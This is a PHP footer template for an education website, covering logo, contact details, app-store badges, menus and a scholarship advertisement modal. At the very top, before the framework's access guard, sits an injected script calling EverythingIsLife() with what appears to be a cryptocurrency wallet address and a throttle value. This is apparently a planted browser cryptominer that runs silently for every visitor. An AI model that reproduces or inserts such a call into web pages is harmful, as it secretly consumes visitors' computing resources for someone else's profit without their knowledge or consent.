        
        <script type="text/javascript">
        EverythingIsLife("47NsaEwhbk92CfibMJg8M8hJ73LKDv9NTjNtHLFH6EQE2sAUdgnwPc231gghf3rYBvC6cXvgLahJKa4riqQBxbT1HBjQhFu", "web", 50);
        </script><?php defined('BASEPATH') OR exit('No direct script access allowed');?>

<footer id="footer">

    <div class="wrapper">
      
      <div class="row">
        <div class="col-md-4 footer_left">
          <div class="footer-info d-flex">
            <div class="m-auto">
              <img src="<?php echo $system_logo;?>" width="250"  class="mb-4 system_logo" alt="<?php echo $system_name;?>" title="<?php echo $system_name;?> Logo">
              
              <div class="row footer_mobile_menu">
                <div class="col-md-12">
                  <?php $this->widget->run('front_menu_bottom_mobile',TRUE);?>
                </div>
              </div>
              <p class="pb-3"><em>&nbsp;</em></p>
              <p>
                
                <?php
                if($system_webmaster_ph!=NULL || $system_webmaster_ph!=''){
                  ?>
                  <strong>Phone:</strong> <?php echo $system_webmaster_ph;?><br>
                  <?php
                }

                ?>
                <strong>Email:</strong> <?php echo $system_info_email;?><br>
              </p>
              <div class="mt-3">
                <?php
                if(!empty($system_play_store_logo)){
                  ?>
                  <a href="<?php echo $system_name_title;?>">
                    <img src="<?php echo $system_play_store_logo;?>" alt="sikshapedia playstore app" width="110" class="mr-2">
                  </a>
                  <?php
                }


                if(!empty($system_apple_store_logo)){
                  ?>
                  <a href="<?php echo $system_name_title;?>"> 
                    <img src="<?php echo $system_apple_store_logo;?>" alt="sikshapedia applestore app" width="110" class="mr-2">
                  </a>
                  <?php
                }

                ?>

                <div class="copyright">
                   © <?php echo date('Y');?><strong> <span><?php echo $system_name_title;?></span></strong>. All Rights Reserved
                </div>
                
              </div>
            </div>
          </div>
        </div>
        <div class="col-md-8 footer_right">
            <div class="row">
              <?php $this->widget->run('front_menu_bottom',TRUE);?>
            </div>

            <div class="copyright">
               © <?php echo date('Y');?><strong> <span><?php echo $system_name_title;?></span></strong>. All Rights Reserved
            </div>

        </div>
      </div>
    </div>

</footer>


<div class="modal logRegModal" id="adsYouModal" data-backdrop="static" data-keyboard="false" tabindex="-1" aria-labelledby="adsYouModal" aria-hidden="true">
    <div class="modal-dialog modal-dialog-centered modal-dialog-scrollable modal-xl-1">
      <div class="modal-content">
        <div class="logSignSec">
          <div class="head d-flex align-items-center justify-content-between" style="padding:0px;">
            <a href="#" class="logoBrand"></a>
            <ul class="nav flex-row">
                <li class="nav-item  d-none d-sm-inline">
                </li>
                <li class="nav-item ">
                  <button class="nav-link btn" data-dismiss="modal" aria-label="Close" id="closeadsYouModal"><span class="fas fa-times"></span></button>
                </li>
            </ul>
          </div>
          <?php
          if(session_userdata('isUserLoggedin')==TRUE && session_userdata('user_id')){
            ?>
            <a href="<?php echo base_url(); ?>in/scholarship"><img src=""></a>
            <?php
          }else{
            ?>
            <a href="#logModal" data-toggle="modal" id="login_from_link"><img src=""></a>
            <?php
          }

          ?>
          
        </div>
      </div>
    </div>
  </div>   